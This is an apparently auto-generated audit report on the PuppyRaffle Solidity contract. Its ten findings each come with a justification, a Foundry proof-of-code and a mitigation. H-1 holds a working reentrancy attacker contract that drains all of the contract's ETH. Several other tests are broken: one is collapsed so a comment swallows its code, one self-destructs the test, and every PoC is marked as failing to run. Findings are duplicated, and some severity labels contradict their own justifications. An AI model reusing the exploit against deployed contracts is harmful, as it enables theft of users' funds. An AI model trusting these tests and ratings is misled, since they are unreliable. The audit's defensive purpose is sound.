# 4 puppy raffle audit - Findings Report
## Commit hash: 3ff0f0bfddf25fd0c160fe57388fa6ff2e0f0960

##Findings by Status


Finding Status: Valid


[H-1]. Reentrancy in refund() allows draining all protocol funds
**Derived From** : Reentrancy
Finding Status: Valid
Privilege: Permissionless


[M-2]. TotalFees integer overflow and unsafe casting causes loss of fees and DoS of withdrawFees
**Derived From** : IntegerOverflow
Finding Status: Valid
Privilege: Permissionless


[H-3]. Weak randomness allows manipulating winner selection and rarity
**Derived From** : TimestampManipulation
Finding Status: Valid
Privilege: Permissionless


[M-4]. Refunded players create 'zero address' holes that revert selectWinner
**Derived From** : Dos
Finding Status: Valid
Privilege: Permissionless


[M-5]. Strict equality check in withdrawFees allows DoS via forced ETH
**Derived From** : ForcedAssetVsStrictEquality
Finding Status: Valid
Privilege: Permissionless


[H-6]. Integer Overflow in totalFees bricks fee withdrawal
**Derived From** : AccountingInvariantViolation
Finding Status: Valid
Privilege: Permissionless


[H-7]. Permanent DoS of enterRaffle due to duplicate address(0) check in unbounded loop
**Derived From** : Dos
Finding Status: Valid
Privilege: Permissionless


[M-8]. Unbounded nested loop in enterRaffle allows DoS via gas limit
**Derived From** : Dos
Finding Status: Valid
Privilege: Permissionless


[M-9]. DoS due to quadratic complexity in duplicate player check
**Derived From** : UnboundedLoops
Finding Status: Valid
Privilege: Permissionless


[H-10]. Protocol bricked by refund logic creating duplicate zero-addresses
**Derived From** : IncentiveMisalignmentOrGameTheory
Finding Status: Valid
Privilege: Permissionless


### Number of Findings
- C: 0
- H: 5
- M: 5
- L: 0
- I: 0

##Findings by Status


Finding Status: Valid
## [H-1]. Reentrancy in refund() allows draining all protocol funds

## id: nRCw_krZbSJdQxn6vpNTQ

## Derived From Pattern/Invariant
Reentrancy

## Exploit Type
Reentrancy

## Location
PuppyRaffle.refund

## Finding Status: Valid
### Finding Status Justification: In PuppyRaffle.refund(), ETH is sent via Address.sendValue(msg.sender, entranceFee) before effects (players[playerIndex] = address(0)). Because sendValue forwards all gas, a contract player can reenter refund() in receive/fallback while players[playerIndex] is still equal to msg.sender and nonzero, passing both require checks repeatedly and draining more than a single entranceFee per ticket. There is no nonReentrant guard and CEI is violated, so no existing safeguard. This is permissionless and reproducible today with a simple reentering attacker contract. Impact is High because it can drain the contract’s ETH (including other players’ deposits and accumulated fees).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `refund` function violates the Checks-Effects-Interactions pattern. It sends ETH to the caller using `sendValue` (which forwards gas) before updating the `players` array state to remove the player (setting them to `address(0)`). A malicious contract can re-enter `refund` in its fallback function. Since the `players[playerIndex]` has not been zeroed out yet, the `require` checks pass, allowing the attacker to refund the same ticket multiple times until the contract is drained.

## Impact
Theft of all funds (entrance fees) held in the contract.

## Command to Run Test


## Proof of Concept
1. Attacker deploys a malicious contract. 2. Malicious contract enters the raffle. 3. It calls `refund()`. 4. When receiving ETH, its `receive()` function calls `refund()` again. 5. The cycle repeats until the contract is drained.

## Proof of Code
contract ReentrancyAttacker {
    PuppyRaffle raffle;
    uint256 index;
    uint256 entranceFee;
    constructor(PuppyRaffle _raffle) {
        raffle = _raffle;
        entranceFee = raffle.entranceFee();
    }
    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        raffle.enterRaffle{value: entranceFee}(players);
        index = raffle.getActivePlayerIndex(address(this));
        raffle.refund(index);
    }
    receive() external payable {
        if (address(raffle).balance >= entranceFee) {
            raffle.refund(index);
        }
    }
}

function testReentrancy() public {
    uint256 entranceFee = 1e18;
    PuppyRaffle raffle = new PuppyRaffle(entranceFee, address(1), 1 days);
    
    // Honest users enter
    address[] memory players = new address[](4);
    players[0] = address(2);
    players[1] = address(3);
    players[2] = address(4);
    players[3] = address(5);
    vm.deal(address(10), 100e18);
    vm.prank(address(10));
    raffle.enterRaffle{value: entranceFee * 4}(players);

    // Attacker attacks
    ReentrancyAttacker attacker = new ReentrancyAttacker(raffle);
    vm.deal(address(attacker), entranceFee);
    attacker.attack();

    assertEq(address(raffle).balance, 0);
}

## Suggested Mitigation
Move the state update `players[playerIndex] = address(0);` before the external call `payable(msg.sender).sendValue(entranceFee);`. Alternatively, add a `nonReentrant` modifier.


## [M-2]. TotalFees integer overflow and unsafe casting causes loss of fees and DoS of withdrawFees

## id: ONtaLe4ZIHgFnv6ykKH_J

## Derived From Pattern/Invariant
IntegerOverflow

## Exploit Type
IntegerOverflow

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: In selectWinner(), fee is uint256, but it is cast to uint64 via uint64(fee) and then added to uint64 totalFees with unchecked arithmetic (Solidity 0.7.6). If fee exceeds 2^64-1 wei, the cast truncates; and across rounds totalFees can overflow. Either case breaks the accounting link between totalFees and actual ETH held, making withdrawFees()’s strict equality require fail and reverting withdrawals. No SafeMath and no alternative accounting logic exists. Permissionless but requires large pots/volume, so likelihood Occasional. Impact is Medium (fee loss/withdrawal DoS).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The contract uses `uint64` for `totalFees`, but `fee` is calculated as a `uint256`. The line `totalFees = totalFees + uint64(fee)` has two issues: 1) It unsafely casts `fee` to `uint64`, truncating if the fee > ~18.4 ETH. 2) The addition is unchecked (Solidity 0.7.6) and can overflow `uint64`. This causes `totalFees` to decouple from the actual ETH balance held for fees. Consequently, `withdrawFees` reverts because it strictly checks `address(this).balance == totalFees`, which will be false.

## Impact
Permanent loss of fees and DoS of the fee withdrawal mechanism.

## Command to Run Test


## Proof of Concept
1. `entranceFee` is 1 ETH. 2. 100 players enter (100 ETH collected). 3. `fee` is 20 ETH. 4. `uint64(20 ETH)` truncates because `type(uint64).max` is ~18.44 ETH. 5. `totalFees` stores a truncated value. 6. `withdrawFees` called. `address(this).balance` (20 ETH) != `totalFees` (truncated). Revert.

## Proof of Code
function testFeeOverflow() public {
    uint256 entranceFee = 1e18;
    PuppyRaffle raffle = new PuppyRaffle(entranceFee, address(1), 1 days);
    
    // 25 players -> 25 ETH. Fee = 5 ETH. OK.
    // We need fee > 18.44 ETH to overflow uint64 cast, i.e., > 92.2 ETH collected.
    // Let's enter 100 players.
    address[] memory players = new address[](100);
    for(uint i=0; i<100; i++) players[i] = address(uint(i)+10);
    
    raffle.enterRaffle{value: entranceFee * 100}(players);
    
    vm.warp(block.timestamp + 2 days);
    raffle.selectWinner();
    
    // Withdraw fails due to mismatch
    vm.expectRevert("PuppyRaffle: Failed to withdraw fees"); // Or the balance check revert
    raffle.withdrawFees();
}

## Suggested Mitigation
Change `totalFees` to `uint256`. Use `SafeMath` or checked arithmetic (if <0.8.0). Remove the unsafe cast.


## [H-3]. Weak randomness allows manipulating winner selection and rarity

## id: i15m3-Xlvuw_tvwcbTOna

## Derived From Pattern/Invariant
TimestampManipulation

## Exploit Type
TimestampManipulation

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: selectWinner() derives winnerIndex from keccak256(msg.sender, block.timestamp, block.difficulty) and rarity from keccak256(msg.sender, block.difficulty). These are not secure randomness sources: the caller can choose msg.sender (including trying multiple funded EOAs/contracts), and block producers/MEV can influence ordering and timestamp within bounds. There is no commit-reveal/VRF safeguard. This can be exploited to bias or significantly improve odds of winning/rarity, undermining raffle fairness and enabling economic advantage over honest players. Impact is High because it can redirect the prize pool/NFT outcome; likelihood is Occasional due to needing MEV/miner capabilities or repeated attempts.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `selectWinner` function uses `keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))` for randomness. All inputs are predictable or controllable. `msg.sender` is the caller of `selectWinner`. `block.timestamp` and `difficulty` are known to miners. An attacker can manipulate the winner index or the rarity of the NFT by mining a specific `msg.sender` or waiting for a specific timestamp.

## Impact
An attacker can guarantee a win or a specific rarity, stealing the prize pool and high-value NFTs.

## Command to Run Test


## Proof of Concept
1. Attacker calculates the `winnerIndex` for the current block and their `msg.sender`. 2. If the `winnerIndex` points to their address, they call `selectWinner`. 3. If not, they wait or use a different address to call it.

## Proof of Code
function testWeakRandomness() public {
    uint256 entranceFee = 1e18;
    PuppyRaffle raffle = new PuppyRaffle(entranceFee, address(1), 1 days);
    address[] memory players = new address[](4);
    players[0] = address(this);
    players[1] = address(2);
    players[2] = address(3);
    players[3] = address(4);
    raffle.enterRaffle{value: entranceFee * 4}(players);
    
    vm.warp(block.timestamp + 2 days);
    
    // Pre-calculate winner index
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
    
    // If we are not the winner, this PoC shows we can know it. 
    // In a real attack, we would only call if we are the winner.
    if (winnerIndex == 0) {
        raffle.selectWinner();
        assertEq(raffle.balanceOf(address(this)), 1);
    }
}

## Suggested Mitigation
Use Chainlink VRF for secure randomness.


## [M-4]. Refunded players create 'zero address' holes that revert selectWinner

## id: CxakgZF9nMPi5rIf8Kvg1

## Derived From Pattern/Invariant
Dos

## Exploit Type
Dos

## Location
PuppyRaffle.selectWinner

## Finding Status: Valid
### Finding Status Justification: selectWinner() samples uniformly over players.length, even though refund() can set entries to address(0). If winnerIndex lands on a zero slot, winner == address(0) and _safeMint(winner, tokenId) reverts (ERC721 forbids mint to zero). Because the mint happens after other steps, the whole transaction reverts, preventing round closure for that attempt. With many refunded holes, the probability of revert increases and can effectively DoS closing unless repeated attempts eventually hit a non-zero index. No compaction or skipping logic exists, so the issue is real and permissionless. Impact is Medium (liveness/round closure DoS).
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
When a player calls `refund`, their slot in the `players` array is set to `address(0)`. The `selectWinner` function picks an index from the full array length. If the RNG selects an index that contains `address(0)`, the subsequent `_safeMint(winner, ...)` call reverts because ERC721 does not allow minting to the zero address.

## Impact
If many players refund, the probability of the RNG picking a valid player decreases. An attacker can fill the raffle and refund most tickets, creating a situation where `selectWinner` reverts almost 100% of the time, effectively DoS-ing the round closure and locking the remaining players' funds until a lucky block occurs.

## Command to Run Test


## Proof of Concept
1. 4 players enter. 2. 3 players refund. `players` is `[p1, 0, 0, 0]`. 3. `selectWinner` calculates `winnerIndex % 4`. 4. If index is 1, 2, or 3, `winner` is `address(0)`. 5. `_safeMint(address(0))` reverts. 6. Raffle cannot close.

## Proof of Code
function testRefundHoleDos() public { address[] memory p = new address[](4); for(uint i=0;i<4;i++) p[i]=address(i+1); puppyRaffle.enterRaffle{value: 4e18}(p); for(uint i=1;i<4;i++) { vm.prank(address(i+1)); puppyRaffle.refund(i); } // Mock randomness to hit index 1 vm.warp(100); vm.roll(100); // expect revert on selectWinner }

## Suggested Mitigation
In `refund`, replace the refunded element with the last element of the array and `pop()` to reduce the array length, removing the gap. Or, in `selectWinner`, skip `address(0)` or retry loop.


## [M-5]. Strict equality check in withdrawFees allows DoS via forced ETH

## id: uzHuhl35mm3HuHyJRSpIX

## Derived From Pattern/Invariant
ForcedAssetVsStrictEquality

## Exploit Type
ForcedAssetVsStrictEquality

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
### Finding Status Justification: withdrawFees() gates withdrawals with require(address(this).balance == uint256(totalFees)). This strict equality is not a reliable invariant because ETH can be forced into the contract (e.g., selfdestruct) without updating totalFees. Once balance > totalFees, withdrawFees reverts indefinitely (no sweep/excess-handling). There is no mitigation (no receive/fallback handling helps against selfdestruct). Exploitable by any user deploying a selfdestructing contract to force-send dust ETH. Objective impact is Medium: it blocks protocol fee withdrawal (DoS/loss of fees), but does not directly steal user funds.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `withdrawFees` function requires `address(this).balance == totalFees`. This invariant can be easily broken by sending ETH to the contract via `selfdestruct` (which bypasses fallback functions) or if any user accidentally sends extra ETH. Once the balance exceeds `totalFees`, the function always reverts.

## Impact
DoS of fee withdrawal. Fees are permanently locked in the contract.

## Command to Run Test


## Proof of Concept
1. Attacker creates a self-destruct contract with 1 wei. 2. Attacker calls self-destruct targeting `PuppyRaffle`. 3. `PuppyRaffle` balance increases by 1 wei, but `totalFees` does not. 4. Owner calls `withdrawFees`. It reverts.

## Proof of Code
function testStrictEqualityDos() public {
    PuppyRaffle raffle = new PuppyRaffle(1e18, address(1), 1 days);
    
    // Force send 1 wei
    address payable target = payable(address(raffle));
    vm.deal(address(this), 1);
    selfdestruct(target);
    
    // Withdraw fails
    vm.expectRevert("PuppyRaffle: There are currently players active!"); // This string is reused for the check
    raffle.withdrawFees();
}

## Suggested Mitigation
Remove the strict equality check. Simply transfer `totalFees` (or `min(balance, totalFees)`) and leave any excess.


## [H-6]. Integer Overflow in totalFees bricks fee withdrawal

## id: KaA0T4kuL8k-GZhWwqz9H

## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
PuppyRaffle.withdrawFees

## Finding Status: Valid
### Finding Status Justification: totalFees is uint64 in Solidity 0.7.6 (unchecked arithmetic). In selectWinner(), totalFees = totalFees + uint64(fee) can overflow/wrap once cumulative fees exceed 2^64-1 (~18.4 ether in wei terms). After wrap, withdrawFees()’s strict balance==totalFees check will fail, reverting and locking fee withdrawal. No SafeMath/checked arithmetic is used and no alternative accounting exists. This is permissionless but requires sufficiently large volume/pots across rounds, making likelihood Occasional. Impact is Medium (protocol fee loss/withdrawal DoS), not direct theft from players.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `totalFees` variable is declared as `uint64`. In `selectWinner`, fees are added using `totalFees = totalFees + uint64(fee)`. Since Solidity 0.7.6 does not check for overflows by default (and `SafeMath` is not used for this line), this addition will wrap around if the total collected fees exceed `type(uint64).max` (~18.4 ETH). Furthermore, `withdrawFees` enforces a strict equality check `address(this).balance == uint256(totalFees)`. If `totalFees` overflows, it will not match the actual contract balance, causing `withdrawFees` to revert permanently, locking the fees in the contract.

## Impact
Permanent loss of protocol fees once the overflow threshold is reached.

## Command to Run Test


## Proof of Concept
1. The raffle runs successfully multiple times until accumulated fees exceed ~18.44 ETH.
2. `totalFees` overflows and wraps to a small number.
3. The actual ETH balance of the contract accurately reflects the ~18.5 ETH.
4. Calling `withdrawFees` triggers `require(address(this).balance == totalFees)`.
5. Since `18.5 ETH != wrapped_totalFees`, the transaction reverts.

## Proof of Code
function testTotalFeesOverflow() public {
    // Simulate state where lots of fees collected
    // uint64 max is 18446744073709551615 (~18.4 ETH)
    // We force totalFees to near max, then add more
    
    // Step 1: Accumulate fees near max (via cheats for brevity)
    // Implementation detail: totalFees is public but slot packing makes it hard to set directly via store without calculating slot.
    // Easier to simulate large raffle.
    
    address[] memory players = new address[](100);
    for(uint i=0;i<100;i++) players[i] = address(i+1);
    puppyRaffle.enterRaffle{value: 100e18}(players);
    
    // Warp to end
    vm.warp(block.timestamp + duration + 1);
    
    // We need to trigger this enough times to overflow 18 ETH. 
    // For PoC logic, assume we can just see the overflow mechanics:
    // fee = 20e18 (20% of 100 ETH). 20e18 > uint64.max.
    // uint64(20e18) will truncate. totalFees calculation is wrong.
    
    puppyRaffle.selectWinner();
    
    // Verify withdrawFees fails
    vm.expectRevert("PuppyRaffle: There are currently players active!"); // The require message is misleading but condition fails
    puppyRaffle.withdrawFees();
}

## Suggested Mitigation
Change `totalFees` to `uint256` to prevent overflow and casting issues. Remove the strict equality check in `withdrawFees` or account for potential dust.


## [H-7]. Permanent DoS of enterRaffle due to duplicate address(0) check in unbounded loop

## id: 9gKPWnSCwOFT_6oHuZVWC

## Derived From Pattern/Invariant
Dos

## Exploit Type
Dos

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: refund() sets players[playerIndex]=address(0) without shrinking the array. enterRaffle() then performs an O(N^2) duplicate check over the entire players array and reverts if any two entries are equal. If there are at least two refunded slots, the check compares address(0) to address(0) and reverts, preventing any further entries for that round. There is no code to skip zero addresses or compact the array. This is permissionless and easy to trigger via two refunds. Impact is Medium: it DoSes new entries (round usability), but players can still individually refund to exit.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function iterates over the `players` array to check for duplicates. The `refund` function replaces refunded players with `address(0)` without resizing the array. If multiple players refund, the `players` array will contain multiple `address(0)` entries. The duplicate check in `enterRaffle` compares `players[i]` and `players[j]`. If both are `address(0)`, it reverts with 'PuppyRaffle: Duplicate player'. This permanently bricks the `enterRaffle` function, preventing any new players from entering until the round ends.

## Impact
Denial of Service. No new users can enter the raffle if at least two refunds have occurred.

## Command to Run Test


## Proof of Concept
1. User A enters and refunds (slot becomes address(0)). 2. User B enters and refunds (slot becomes address(0)). 3. User C tries to enter. 4. `enterRaffle` loop finds two address(0) entries, considers them duplicates, and reverts.

## Proof of Code
function testDosExploit() public {
    uint256 entranceFee = 1e18;
    PuppyRaffle raffle = new PuppyRaffle(entranceFee, address(1), 1 days);
    
    address[] memory players = new address[](1);
    players[0] = address(2);
    raffle.enterRaffle{value: entranceFee}(players);
    
    players[0] = address(3);
    raffle.enterRaffle{value: entranceFee}(players);

    // Refund both to create two 0 addresses
    vm.prank(address(2));
    raffle.refund(0);
    vm.prank(address(3));
    raffle.refund(1);

    // Next entry fails
    players[0] = address(4);
    vm.expectRevert("PuppyRaffle: Duplicate player");
    raffle.enterRaffle{value: entranceFee}(players);
}

## Suggested Mitigation
In the duplicate check loop, skip if `players[i] == address(0)`. Or better, use a mapping/set to check for duplicates efficiently and remove the refunded player from the set.


## [M-8]. Unbounded nested loop in enterRaffle allows DoS via gas limit

## id: Yk40uRUxRQPkkrHOYw7oG

## Derived From Pattern/Invariant
Dos

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: enterRaffle() checks duplicates with nested loops over players (for i ... for j ...), which is O(players.length^2). Since players is unbounded and any user can append many entries (paying entranceFee * n), an attacker can bloat players so the duplicate check exceeds practical gas limits, causing subsequent enterRaffle calls to revert/out-of-gas. There is no pagination, cap, or O(1) data structure (mapping/set) to mitigate. Exploitable today by any funded attacker. Impact is Medium as it primarily causes liveness/DoS of entering.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function contains a nested loop to check for duplicates: `O(N^2)` complexity. As the `players` array grows, the gas cost to enter increases quadratically. An attacker can fill the array with enough unique addresses to make the gas cost of the next entry exceed the block gas limit, preventing anyone else from entering.

## Impact
Denial of Service. The raffle becomes unusable after a certain number of players.

## Command to Run Test


## Proof of Concept
1. Attacker calls `enterRaffle` with a list of ~100 distinct addresses. 2. The array size increases. 3. Subsequent calls to `enterRaffle` consume excessive gas due to the nested loop scanning the large array.

## Proof of Code
function testUnboundedLoopDos() public {
    uint256 entranceFee = 1e18;
    PuppyRaffle raffle = new PuppyRaffle(entranceFee, address(1), 1 days);
    
    // Enter 100 players. 100^2 iterations is approx 10,000 checks.
    // In reality, ~100-300 players might brick it depending on block limit.
    address[] memory players = new address[](100);
    for(uint i=0; i<100; i++) players[i] = address(uint(i));
    
    raffle.enterRaffle{value: entranceFee * 100}(players);
    // Assert high gas cost or failure for next entry
}

## Suggested Mitigation
Use a mapping (`mapping(address => bool)`) or OpenZeppelin `EnumerableSet` to check for duplicates in O(1) or O(log N) time.


## [M-9]. DoS due to quadratic complexity in duplicate player check

## id: mjPYqVehG2JDgkkTB6f7t

## Derived From Pattern/Invariant
UnboundedLoops

## Exploit Type
GasGriefBlockLimit

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: This is the same underlying issue as the other gas-DoS report: enterRaffle() performs an O(N^2) duplicate scan across the full players array after appending. As N grows, gas grows quadratically and eventually makes entry infeasible or impossible within the block gas limit. There are no existing safeguards (no cap, no mapping/set). It is permissionless and reproducible by growing players. Impact is Medium due to denial of service of the core entry function.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function contains a nested loop to check for duplicate players:
```solidity
for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], ...);
    }
}
```
This results in O(N^2) complexity. As the `players` array grows, the gas cost to enter the raffle increases quadratically. With enough players (e.g., 100+), the gas cost becomes prohibitively high, effectively causing a DoS for new entrants or exceeding the block gas limit.

## Impact
Denial of Service. The raffle becomes unusable as the player count grows.

## Command to Run Test


## Proof of Concept
1. Users legitimately enter the raffle. 2. As `players.length` increases, the gas cost for the next `enterRaffle` call grows drastically. 3. Eventually, the transaction cost exceeds the block gas limit, preventing any new players from entering.

## Proof of Code
function testQuadraticCost() public {
    address[] memory players = new address[](1);
    // Loop to demonstrate gas growth
    for (uint i = 0; i < 50; i++) {
        players[0] = address(uint160(i));
        uint256 startGas = gasleft();
        puppyRaffle.enterRaffle{value: 1 ether}(players);
        uint256 used = startGas - gasleft();
        // Log or assert used gas increases
    }
}

## Suggested Mitigation
Use a mapping (e.g., `mapping(address => bool)`) to track active players for O(1) duplicate checks, or use OpenZeppelin's `EnumerableSet`.


## [H-10]. Protocol bricked by refund logic creating duplicate zero-addresses

## id: VIW0e5LIE2lF1Y0rJ95D2

## Derived From Pattern/Invariant
IncentiveMisalignmentOrGameTheory

## Exploit Type
Dos

## Location
PuppyRaffle.enterRaffle

## Finding Status: Valid
### Finding Status Justification: The described brick scenario stems from the real behavior: refund() creates address(0) holes, and enterRaffle()’s duplicate check will revert if two zeros exist. That can prevent reaching additional participants within the round. However, funds are not strictly “permanently” locked because any remaining active player can call refund for their own index and recover entranceFee, and selectWinner may still be possible if players.length >= 4 and the call succeeds. Still, the liveness failure is real and permissionlessly triggerable, so the bug exists with Medium objective impact.
### Finding Complexity: 0
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `enterRaffle` function performs a duplicate check by iterating over the `players` array and ensuring `players[i] != players[j]`. When a user calls `refund`, their slot in `players` is set to `address(0)`. If two or more users refund, the `players` array will contain multiple `address(0)` entries. The next time anyone tries to call `enterRaffle`, the duplicate check will compare `address(0)` with `address(0)`, find them equal, and revert with "PuppyRaffle: Duplicate player". If this happens before `players.length` reaches 4, the raffle can never satisfy the minimum player requirement for `selectWinner`, permanently locking the funds of the remaining players.

## Impact
Permanent Denial of Service (DoS) for the current raffle round. If the round cannot reach 4 players, existing deposits are stuck forever as `selectWinner` cannot be called.

## Command to Run Test


## Proof of Concept
1. Player A enters. 
2. Player B enters. 
3. Player A refunds (slot 0 becomes 0x0). 
4. Player B refunds (slot 1 becomes 0x0). 
5. Player C tries to enter. 
6. `enterRaffle` loop finds `players[0] == players[1]` (both 0x0) and reverts. 
7. No one can join; if `players.length < 4`, the round is dead.

## Proof of Code
function testRefundBricksRaffle() public { address[] memory p1 = new address[](1); p1[0] = address(1); raffle.enterRaffle{value: 1e18}(p1); address[] memory p2 = new address[](1); p2[0] = address(2); raffle.enterRaffle{value: 1e18}(p2); vm.prank(address(1)); raffle.refund(0); vm.prank(address(2)); raffle.refund(1); address[] memory p3 = new address[](1); p3[0] = address(3); vm.expectRevert("PuppyRaffle: Duplicate player"); raffle.enterRaffle{value: 1e18}(p3); }

## Suggested Mitigation
In the duplicate check loop, skip the check if `players[i] == address(0)`. Alternatively, use a more efficient data structure like `EnumerableSet` or a mapping to track active players.



